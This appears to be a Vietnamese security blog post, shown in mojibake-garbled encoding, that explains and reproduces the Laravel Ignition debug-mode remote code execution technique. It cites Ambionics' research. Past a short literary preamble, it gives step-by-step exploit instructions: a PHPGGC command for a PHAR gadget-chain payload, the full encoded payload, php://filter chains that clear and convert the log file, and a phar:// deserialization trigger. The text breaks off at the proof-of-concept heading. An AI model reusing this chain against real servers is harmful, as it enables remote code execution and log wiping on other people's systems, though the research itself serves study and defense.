[{"content":"Táº£n máº¡n \u0026ldquo;Háº±ng nÄƒm cá»© vÃ o cuá»‘i Ä‘Ã´ng, lÃ¡ ngoÃ i Ä‘Æ°á»ng rá»¥ng nhiá»u vÃ  trÃªn khÃ´ng cÃ³ nhá»¯ng Ä‘Ã¡m mÃ¢y bÃ ng báº¡c, lÃ²ng tÃ´i láº¡i nao ná»©c nhá»¯ng ká»· niá»‡m hoang mang.\nTÃ´i khÃ´ng thá»ƒ nÃ o quÃªn Ä‘Æ°á»£c nhá»¯ng cáº£m giÃ¡c trong sÃ¡ng áº¥y náº£y ná»Ÿ trong lÃ²ng tÃ´i nhÆ° máº¥y cÃ nh hoa tÆ°Æ¡i má»‰m cÆ°á»i giá»¯a báº§u trá»i quang Ä‘Ã£ng.\nNhá»¯ng Ã½ tÆ°á»Ÿng áº¥y tÃ´i chÆ°a láº§n nÃ o ghi lÃªn giáº¥y, vÃ¬ há»“i áº¥y tÃ´i khÃ´ng biáº¿t ghi vÃ  ngÃ y nay tÃ´i khÃ´ng nhá»› háº¿t. NhÆ°ng má»—i láº§n tháº¥y cÃ¡c báº¡n viáº¿t nhá»¯ng nghiÃªn cá»©u cá»§a báº£n thÃ¢n mÃ¬nh Ä‘á»ƒ chia sáº» cho má»i ngÆ°á»i, lÃ²ng tÃ´i láº¡i tÆ°ng bá»«ng rá»™n rÃ£.\nBuá»•i sÃ¡ng mai hÃ´m áº¥y, má»™t buá»•i mai Ä‘áº§y sÆ°Æ¡ng thu vÃ  giÃ³ láº¡nh. TÃ´i Ã¢u yáº¿m ngá»“i lÃªn chiáº¿c Sirius quen thuá»™c rá»“i Ä‘i trÃªn nhá»¯ng con phá»‘ HÃ  Ná»™i Ä‘áº§y táº¥p náº­p. Con Ä‘Æ°á»ng nÃ y tÃ´i Ä‘Ã£ quen Ä‘i láº¡i láº¯m láº§n, nhÆ°ng láº§n nÃ y tá»± nhiÃªn tÃ´i tháº¥y láº¡. Cáº£nh váº­t chung quanh tÃ´i Ä‘á»u thay Ä‘á»•i, vÃ¬ chÃ­nh lÃ²ng tÃ´i Ä‘ang cÃ³ sá»± thay Ä‘á»•i lá»›n: HÃ´m nay tÃ´i Ä‘i lÃ m\u0026rdquo;\nGiá»¯a cÃ¡i thá»i tiáº¿t rÃ©t buá»‘t Ä‘áº¿n Ä‘á»™ má»—i sÃ¡ng ngÆ°á»i ta sáº½ Ä‘Ã¡nh váº­t vá»›i lÃ½ trÃ­ cá»§a báº£n thÃ¢n: dáº­y chuáº©n bá»‹ Ä‘i lÃ m hay xin Inlate 2 tiáº¿ng Ä‘á»ƒ Ä‘i ngá»§ thÃªm. CÃ²n tÃ´i thÃ¬ váº«n nhÆ° má»™t thÃ³i quen, 6h sÃ¡ng chiáº¿c Google Home Mini Ä‘Ã¡nh thá»©c tÃ´i dáº­y báº±ng báº£n nháº¡c \u0026ldquo;GiÃ¡ nhÆ°\u0026rdquo; cá»§a Chillies, má»™t bÃ i mÃ  tÃ´i ráº¥t thÃ­ch trong thá»i gian gáº§n Ä‘Ã¢y. TrÆ°á»›c khi rá»i khá»i chiáº¿c chÄƒn áº¥m cá»§a mÃ¬nh, Ä‘áº§u tiÃªn tÃ´i sáº½ tÃ¬m cÃ¡i Ä‘iá»‡n thoáº¡i cá»§a mÃ¬nh vÃ  xem ngÃ y hÃ´m nay tháº¿ giá»›i Ä‘Ã£ thay Ä‘á»•i Ä‘Æ°á»£c nhá»¯ng gÃ¬, lÆ°á»›t 1 dáº¡o tháº¥y má»™t bÃ i Writeup vá»«a má»›i Ä‘Æ°á»£c public khÃ´ng lÃ¢u á»Ÿ Laravel \u0026lt;= v8.4.2 debug mode: Remote code execution. TÃ´i dáº§n dáº§n chÃº Ã½ vÃ o tiÃªu Ä‘á» cá»§a bÃ i viáº¿t vÃ  Ä‘á»c má»™t chÃºt ná»™i dung trong nÃ y. ChÃ ! má»™t bÃ i viáº¿t tháº­t cÃ´ng phu, sÃ¡ng nay tÃ´i láº¡i cÃ³ thá»© má»›i Ä‘á»ƒ nghiÃªn cá»©u rá»“i. Váº­y lÃ  tÃ´i chuáº©n bá»‹ lÃªn Ä‘Æ°á»ng Ä‘i lÃ m vá»›i má»™t cáº£m xÃºc tháº­t tÆ°Æ¡i vui. HÃ´m nay tÃ´i Ä‘i lÃ m.\n Táº£n máº¡n váº­y Ä‘á»§ rá»“i, bÃ i viáº¿t nÃ y lÃ  bÃ i viáº¿t vá» ká»¹ thuáº­t chá»© khÃ´ng pháº£i bÃ i vÄƒn xuÃ´i Ä‘Ã¢u :D\n  Táº¥t cáº£ ná»™i dung trong bÃ i viáº¿t nÃ y Ä‘Æ°á»£c tham kháº£o trong bÃ i viáº¿t https://www.ambionics.io/blog/laravel-debug-rce\n Laravel \u0026lt;= v8.4.2 debug mode: Remote code execution LÃ m cÃ¡i video cho nÃ³ tÃ­n cÃ¡i Ä‘Ã£  .__h_video { position: relative; padding-bottom: 56.23%; height: 0; overflow: hidden; width: 100%; background: #000; } .__h_video img { width: 100%; height: auto; color: #000; } .__h_video .play { height: 72px; width: 72px; left: 50%; top: 50%; margin-left: -36px; margin-top: -36px; position: absolute; cursor: pointer; }  \nTrong quÃ¡ trÃ¬nh Ä‘i test cÃ¡c dá»± Ã¡n cá»§a khÃ¡ch hÃ ng, mÃ¬nh thÆ°á»ng xuyÃªn tháº¥y cÃ¡i mode debug nÃ y Ä‘Æ°á»£c báº­t, ngÃ y xÆ°a cÃ²n láº¥y Ä‘Æ°á»£c cáº£ APP_KEYS rá»“i RCE luÃ´n server test, Ä‘Æ°á»£c ngay cÃ¡i bÃ¡o cÃ¡o xá»‹n, tuy nhiÃªn Ä‘áº¥y lÃ  cÃ¢u chuyá»‡n cá»§a Laravel 5 trá»Ÿ xuá»‘ng thÃ´i, cÃ²n bÃ¢y giá» tá»« Laravel 6 trá»Ÿ lÃªn thÃ¬ nÃ³ sá»­ dá»¥ng Ignition Ä‘á»ƒ hiá»ƒn thá»‹ debug. Ignition Ä‘Æ°á»£c báº­t tá»± Ä‘á»™ng trong Laravel 6 trá»Ÿ lÃªn.\nIgnition \u0026lt;= 2.5.1 á» Ä‘Ã¢y mÃ¬nh cÃ³ 1 file hello.blade.php cÃ³ ná»™i dung lÃ  {{ $username }}, náº¿u sá»­ dá»¥ng má»™t biáº¿n mÃ  khÃ´ng Ä‘Æ°á»£c define thÃ¬ nÃ³ sáº½ tráº£ vá» má»™t lá»—i nhÆ° hÃ¬nh bÃªn trÃªn. Khi ta click vÃ o Make variable Optional thÃ¬ nÃ³ sáº½ tá»± Ä‘á»™ng replace {{ $username }} thÃ nh {{ $username ? '' }}. Kiá»ƒm tra log thÃ¬ ta tháº¥y Ä‘Æ°á»£c request nhÆ° sau:\nNhá»¯ng researcher á»Ÿ Ambionics Ä‘Ã£ nghÄ© Ä‘áº¿n cÃ¡c sá»­ dá»¥ng chÃ­nh tÃ­nh nÄƒng nÃ y Ä‘á»ƒ cÃ³ thá»ƒ thay Ä‘á»•i ná»™i dung cá»§a file báº¥t ká»³\nclass MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this-\u0026gt;makeOptional($parameters); if ($output !== false) { file_put_contents($parameters[\u0026#39;viewFile\u0026#39;], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters[\u0026#39;viewFile\u0026#39;]); // [1]  $newContents = str_replace(\u0026#39;$\u0026#39;.$parameters[\u0026#39;variableName\u0026#39;], \u0026#39;$\u0026#39;.$parameters[\u0026#39;variableName\u0026#39;].\u0026#34; ?? \u0026#39;\u0026#39;\u0026#34;, $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2]  $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this-\u0026gt;generateExpectedTokens($originalTokens, $parameters[\u0026#39;variableName\u0026#39;]); if ($expectedTokens !== $newTokens) { // [3]  return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE \u0026amp;\u0026amp; $token[1] === \u0026#39;$\u0026#39;.$variableName) { $expectedTokens[] = [T_WHITESPACE, \u0026#39; \u0026#39;, $token[2]]; $expectedTokens[] = [T_COALESCE, \u0026#39;??\u0026#39;, $token[2]]; $expectedTokens[] = [T_WHITESPACE, \u0026#39; \u0026#39;, $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \u0026#34;\u0026#39;\u0026#39;\u0026#34;, $token[2]]; } } return $expectedTokens; } ... } Sau khi Ä‘á»c Ä‘Æ°á»£c file path truyá»n vÃ o [1] vÃ  thay tháº¿ $variableName thÃ nh variableName ?? \u0026quot; cáº£ file ban Ä‘áº§u vÃ  file má»›i Ä‘á»u sáº½ Ä‘Æ°á»£c mÃ£ hÃ³a [2] vÃ  file ban Ä‘áº§u Ä‘Æ°á»£c thay tháº¿ báº±ng ná»™i dung má»›i cá»§a nÃ³. Náº¿u khÃ´ng, makeOptional sáº½ tráº£ vá» false [3] vÃ  file má»›i sáº½ khÃ´ng Ä‘Æ°á»£c ghi. Do Ä‘Ã³, khÃ´ng thá»ƒ lÃ m Ä‘Æ°á»£c gÃ¬ nhiá»u khi sá»­ dá»¥ng variableName.\nInput variable duy nháº¥t cÃ²n láº¡i lÃ  viewFile, tá»« Ä‘oáº¡n code trÃªn cÃ³ thá»ƒ viáº¿t láº¡i Ä‘oáº¡n code rÃºt gá»n nhÆ° sau:\n$contents = file_get_contents($parameters[\u0026#39;viewFile\u0026#39;]); file_put_contents($parameters[\u0026#39;viewFile\u0026#39;], $contents); Äoáº¡n code nÃ y láº¥y ná»™i dung láº¥y tá»« viewFile rá»“i chÃ¨n trá»Ÿ láº¡i viewFile. Cháº³ng Ä‘á»ƒ lÃ m gÃ¬ cáº£ Ä‘Ãºng khÃ´ng ğŸ™ƒ\nLog file to PHAR PHP wrappers: changing a file CÃ³ má»™t ká»¹ thuáº­t Ä‘Æ°á»£c trÃ¬nh bÃ y bá»Ÿi Orange Tsai http://blog.orange.tw/2018/10/. NÃ³ sá»­ dá»¥ng php:filter Ä‘á»ƒ thay Ä‘á»•i ná»™i dung cá»§a file trÆ°á»›c khi Ä‘Æ°á»£c tráº£ vá». VÃ  bÃ¢y giá» cÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t nÃ y Ä‘á»ƒ chuyá»ƒn ná»™i dung cá»§a file báº±ng cÃ¡ch sá»­ dá»¥ng cÃ¡ch sau:\n$ echo test | base64 | base64 \u0026gt; /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K $f = \u0026#39;php://filter/convert.base64-decode/resource=/path/to/file.txt\u0026#39;; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents($f); # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents($f, $contents); $ cat /path/to/file.txt test Váº­y cÃ³ thá»ƒ sá»­a Ä‘á»•i ná»™i dung file theo cÃ¡ch nÃ y, tuy nhiÃªn chÃºng ta cáº§n pháº£i sá»­a Ä‘á»•i ná»™i dung file chá»‰ Ä‘Æ°á»£c vá»›i 1 dÃ²ng duy nháº¥t\n# To base64-decode once, use: $f = \u0026#39;php://filter/read=convert.base64-decode/resource=/path/to/file.txt\u0026#39;; # OR $f = \u0026#39;php://filter/write=convert.base64-decode/resource=/path/to/file.txt\u0026#39;; Tháº­m chÃ­ file chá»©a nhá»¯ng charset khÃ´ng náº±m trong base64 (badchars) thÃ¬ PHP bá» qua nhá»¯ng badchars nÃ y vÃ  váº«n decode nhÆ° bÃ¬nh thÆ°á»ng\n$ echo \u0026#39;:;.!!!!!ZEdWemRBbz0K:;.!!!!!\u0026#39; \u0026gt; /path/to/file.txt $f = \u0026#39;php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt\u0026#39;; $contents = file_get_contents($f); file_put_contents($f, $contents); $ cat /path/to/file.txt test Váº­y giá» chÃºng ta cáº§n pháº£i tÃ¬m Ä‘Æ°á»£c 1 file mÃ  mÃ¬nh cÃ³ thá»ƒ control Ä‘Æ°á»£c thÃ´ng tin ghi vÃ o file, á»Ÿ Ä‘Ã¢y chÃ­nh lÃ  file log máº·c Ä‘á»‹nh cá»§a Laravel\nWrite the log file Theo máº·c Ä‘á»‹nh, file log cá»§a Laravel chá»©a má»i lá»—i PHP vÃ  stack trace, Ä‘Æ°á»£c lÆ°u trong storage/log/laravel.log. Cá»‘ gáº¯ng táº¡o ra lá»—i Ä‘á»ƒ Ä‘Æ°á»£c ghi lá»—i vÃ o file log =)).\n[2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {\u0026quot;exception\u0026quot;:\u0026quot;[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-\u0026gt;handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution-\u0026gt;makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution-\u0026gt;run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController-\u0026gt;__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline-\u0026gt;Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline-\u0026gt;then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel-\u0026gt;sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel-\u0026gt;handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...') #37 {main} \u0026quot;} Váº­y lÃ  chÃºng ta cÃ³ thá»ƒ cÃ³ thá»ƒ Ä‘Æ°a ná»™i dung tÃ¹y Ã½ vÃ o má»™t file. Sau Ä‘Ã³ chuyá»ƒn Ä‘á»•i file log thÃ nh file PHAR vÃ  sá»­ dá»¥ng phar Ä‘á»ƒ RCE ğŸ˜ƒ\nTuy ráº±ng nghe cÃ³ váº» dá»… nhÆ° váº­y nhÆ°ng tháº­t ra cÃ³ ráº¥t nhiá»u váº¥n Ä‘á»\nConvert file NhÆ° á»Ÿ trÃªn, ta biáº¿t ráº±ng PHP sáº½ bá» qua báº¥t ká»³ badchar nÃ o khi sá»­ dá»¥ng base64-decoding. Äiá»u nÃ y Ä‘Ãºng, ngoáº¡i trá»« má»™t character: =. Náº¿u báº¡n sá»­ dá»¥ng base64-decode filter má»™t chuá»—i cÃ³ chá»©a = á»Ÿ giá»¯a, PHP sáº½ táº¡o ra lá»—i vÃ  khÃ´ng tráº£ vá» káº¿t quáº£ nÃ o.\nChÃºng ta cÃ³ thá»ƒ kháº¯c phá»¥c Ä‘Æ°á»£c Ä‘iá»u nÃ y náº¿u chÃºng ta cÃ³ thá»ƒ control Ä‘Æ°á»£c ná»™i dung file Ä‘Ã³. Tuy nhiÃªn, payload chÃºng ta Ä‘Æ°a vÃ o file log chá»‰ lÃ  má»™t pháº§n ráº¥t nhá» cá»§a nÃ³. á» má»—i Ä‘oáº¡n log sáº½ cÃ³ 1 Ä‘oáº¡n prefix (timestamp) -\u0026gt; Payload -\u0026gt; suffix (stack strace). HÆ¡n ná»¯a, payload láº¡i xuáº¥t hiá»‡n2 láº§n trong file log nhÆ° vÃ­ dá»¥ dÆ°á»›i Ä‘Ã¢y:\n[2021-01-13 11:09:46] local.ERROR: file_get_contents(PAYLOAD): failed to open stream: No such file or directory {\u0026quot;exception\u0026quot;:\u0026quot; [object] (ErrorException(code: 0): file_get_contents(PAYLOAD): failed to open stream: No such file or directory at /var/www/html/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-\u0026gt;handleError(2, 'file_get_conten...', '/var/www/html/v...', 75, Array) Sau nhiá»u láº§n thá»­ nghiá»‡m, nhá»¯ng researcher cá»§a Ambionics Ä‘Ã£ tÃ¬m ra cÃ¡ch Ä‘á»ƒ loáº¡i bá» cÃ¡c pháº§n dÆ° thá»«a Ä‘á»ƒ láº¥y Ä‘Æ°á»£c Payload. VÃ­ dá»¥ vá»›i trÆ°á»ng há»£p nhÆ° sau:\n[prefix]PAYLOAD[midfix]PAYLOAD[suffix] CÃ¡ch mÃ  há» sá»­ dá»¥ng lÃ  sá»­ dá»¥ng chuyá»ƒn Ä‘á»•i báº£ng mÃ£ UTF-16 sang UTF-8. VÃ¬ cá»© 2 byte thÃ¬ sáº½ Ä‘Æ°á»£c 1 char theo mÃ£ UTF-16 nÃªn convert sang UTF-8 thÃ¬ P\\0 -\u0026gt; P. CÃ²n cÃ¡c cáº·p 2 byte á»Ÿ prefix, midfix, suffix sáº½ bá»‹ convert thÃ nh junk char giá»‘ng nhÆ° dÆ°á»›i Ä‘Ã¢y (vÃ  pháº§n junk nÃ y sau Ä‘Ã³ sáº½ bá»‹ loáº¡i bá» á»Ÿ bÆ°á»›c base64 decoding):\necho -ne \u0026#39;[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]\u0026#39; \u0026gt; /tmp/test.txt php \u0026gt; echo file_get_contents(\u0026#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt\u0026#39;); å›æµ¯â¥ç‰°æ™¥ç¡©å´ PAYLOADæµ›æ‘©æ¥¦åµ¸PAYLOADå›æµ¯â¥ç•³æ™¦ç¡©å´  Ok, giá» ta Ä‘Ã£ giá»¯ Ä‘Æ°á»£c ná»™i dung cá»§a payload, bÆ°á»›c tiáº¿p theo lÃ  loáº¡i bá» nhá»¯ng kÃ½ tá»± nÃ o khÃ´ng pháº£i lÃ  ASCII lÃ  xong. Tuy nhiÃªn cÃ³ má»™t váº¥n Ä‘á» lÃ  ná»™i dung Payload láº¡i hiá»ƒn thá»‹ 2 láº§n, chÃºng ta cáº§n pháº£i loáº¡i bá» 1 cÃ¡i Ä‘i má»›i Ä‘Ãºng cáº¥u trÃºc cá»§a file PHAR. Äá»ƒ giáº£i quyáº¿t váº¥n Ä‘á» nÃ y ta láº¡i nhá»› láº¡i lÃ  UTF-16 lÃ m viá»‡c vá»›i hai byte, nÃªn chá»‰ cáº§n thÃªm 1 byte vÃ o pháº§n giá»¯a Payload 1 vÃ  Payload 2 (nhÆ° dÆ°á»›i Ä‘Ã¢y lÃ  thÃªm X vÃ o sau D\\0) thÃ¬ byte aligment cá»§a Payload thá»© 2 sáº½ bá»‹ lá»‡ch, dáº«n Ä‘áº¿n Payload 2 bá»‹ convert thÃ nh junk chars:\necho -ne \u0026#39;[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]\u0026#39; \u0026gt; /tmp/test.txt php \u0026gt; echo file_get_contents(\u0026#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt\u0026#39;); å›æµ¯â¥ç‰°æ™¥ç¡©å´ PAYLOADå­˜æ¥­æ™¤ç¡©åä„€å¤€ä°€ä¼€ä„€ä€å €å›æµ¯â¥ç•³æ™¦ç¡©å´  Váº­y, káº¿t luáº­n chÃºng ta sáº½ cÃ³ get chain cuá»‘i cÃ¹ng lÃ :\nviewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log Complete exploit steps BÆ°á»›c 1: Táº¡o PHPGGC payload vÃ  encode nÃ³ theo format trÃªn: php -d\u0026#39;phar.readonly=0\u0026#39; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E \u0026#39;s/./\\0=00/g\u0026#39; ChÃº Ã½, chá»‰nh sá»­a má»™t chÃºt á»Ÿ phÃ­a Ä‘áº§u ra Payload, thay tháº¿ dáº¥u == thÃ nh =3D. MÃ¬nh cÅ©ng k hiá»ƒu vÃ¬ sao Ambionics cháº¡y Ä‘Æ°á»£c vá»›i 2 dáº¥u = á»Ÿ cuá»‘i payload, mÃ¬nh cháº¡y toÃ n bá»‹ lá»—i\nWarning: file_get_contents(): stream filter (convert.quoted-printable-decode): invalid byte sequence in php shell code on line 1 Sau má»™t há»“i anh em debug thÃ¬ phÃ¡t hiá»‡n ra pháº£i sá»­a 1 dáº¥u = thÃ nh 3D thÃ¬ cháº¡y ngon ngháº», náº¿u tháº¥y xuáº¥t hiá»‡n lá»—i\nWarning: file_get_contents(): iconv stream filter (\u0026quot;utf-16le\u0026quot;=\u0026gt;\u0026quot;utf-8\u0026quot;): invalid multibyte sequence in php shell code on line 1 thÃ¬ pháº£i Ä‘á»‡m thÃªm 1 byte =00 vÃ o Ä‘á»ƒ decode Ä‘Æ°á»£c nhÃ©.\nBÆ°á»›c 2: XoÃ¡ log viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log  Cháº³ng hiá»ƒu kiá»ƒu gÃ¬ báº¡n vá»›i sáº¿p mÃ¬nh dÃ¹ng cÃ¡ch nÃ y xoÃ¡ Ä‘Æ°á»£c log mÃ  mÃ¬nh pháº£i dÃ¹ng cÃ¡ch khÃ¡c Ä‘á»ƒ xoÃ¡ log \u0026gt;.\u0026lt;\n BÆ°á»›c 3: Táº¡o log chá»©a payload viewFile: P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00F=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00u=00A=00g=00A=00A=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00T=00z=00o=00y=00O=00T=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00E=00J=001=00Z=00m=00Z=00l=00c=00k=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00c=006=00e=003=00M=006=00M=00T=00A=006=00I=00g=00A=00q=00A=00G=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=000=004=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00f=00Q=00U=00A=00A=00A=00B=00k=00d=00W=001=00t=00e=00Q=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00H=00R=00l=00c=003=00R=000=00Z=00X=00N=000=00C=00Q=00/=006=00k=00s=000=00G=00x=00r=00d=00l=00r=00x=00x=007=00q=00r=009=003=00V=00/=00X=00T=002=00F=00k=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00 BÆ°á»›c 4: Convert file log sang file PHAR viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log ChÃº Ã½, á»Ÿ bÆ°á»›c nÃ y cÃ³ thá»ƒ sá»­ dá»¥ng utf-16le hoáº·c utf-16be, tuá»³ theo cÃ¡c nÃ o Ä‘Æ°á»£c nhÃ©\n MÃ¬nh sá»­ dá»¥ng cÃ¡ch nÃ y Ä‘á»ƒ xÃ³a log, khi mÃ  nÃ³ hoáº¡t Ä‘á»™ng chÃ­nh xÃ¡c, sáº½ k tÃ¬m tháº¥y Ä‘oáº¡n base64 nÃ o cáº£ nÃªn output tráº£ vá» lÃ  khÃ´ng cÃ³ gÃ¬, thÃ nh ra xÃ³a Ä‘Æ°á»£c log. Gá»­i request 1 láº§n k Ä‘Æ°á»£c thÃ¬ thá»­ vÃ i láº§n xem sao nhÃ©.\n BÆ°á»›c 5: Cháº¡y PHAR deserialization viewFile: phar:///path/to/storage/logs/laravel.log VÃ  ta Ä‘Æ°á»£c thÃ nh quáº£\nExploit PoC Náº¿u ai muá»‘n thá»­ 